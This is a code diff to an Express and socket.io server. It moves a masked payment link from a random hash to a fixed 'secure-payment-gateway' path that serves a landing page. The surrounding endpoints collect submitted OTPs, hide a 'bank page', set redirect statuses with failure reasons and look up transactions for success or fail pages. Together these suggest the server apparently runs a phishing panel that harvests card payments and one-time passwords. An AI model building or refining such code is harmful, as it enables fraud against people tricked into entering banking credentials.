@@ -12,28 +12,24 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Generate a random hash for the payments path
-const PAYMENT_HASH = crypto.randomBytes(16).toString('hex');
-console.log(`Payment URL hash: /${PAYMENT_HASH}`);
-
-// Create a special route for masked landing page
-app.get(`/${PAYMENT_HASH}`, (req, res) => {
-  // Forward all query parameters to landing.html
-  const queryString = Object.entries(req.query)
-    .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
-    .join('&');
-  
-  // Redirect to the actual landing.html with all query parameters
-  // Use 302 to ensure browsers follow the redirect
-  res.redirect(`/landing.html${queryString ? '?' + queryString : ''}`);
-});
+// Generate a fixed random string to use for all payment links
+// Using a fixed string ensures links don't change between server restarts
+const PAYMENT_PATH = 'secure-payment-gateway';
 
 // Serve static files
 app.use(express.static("."));
 
+// Special route for the masked payment link that should come AFTER static files middleware
+app.get(`/${PAYMENT_PATH}`, (req, res) => {
+  // Forward the request to landing.html with all query parameters intact
+  const fullPath = path.join(process.cwd(), 'landing.html');
+  res.sendFile(fullPath);
+});
+
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Payment URL path: /${PAYMENT_PATH}`);
 });
 
 const io = new Server(server);
@@ -57,7 +53,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
     // Use the masked URL for payment link
-    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_HASH}?pid=${invoiceId}`;
+    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_PATH}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -73,7 +69,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// The rest of your code remains unchanged
+// The rest of your code remains completely unchanged - leave all other functions as they are
+
+// All your other API endpoints remain the same
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -182,7 +180,6 @@ app.post('/api/submitOTP', (req, res) => {
   res.json({ status: "success", message: "OTP received" });
 });
 
-// UPDATED: Add failure reason to redirect status
 app.post('/api/updateRedirectStatus', (req, res) => {
   const { invoiceId, redirectStatus, failureReason } = req.body;
   const txn = transactions.get(invoiceId);
@@ -227,7 +224,6 @@ app.post('/api/hideBankpage', (req, res) => {
   res.json({ status: 'success' });
 });
 
-// NEW: Add transaction data endpoints for success and fail pages
 app.get('/api/getTransactionForSuccess', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
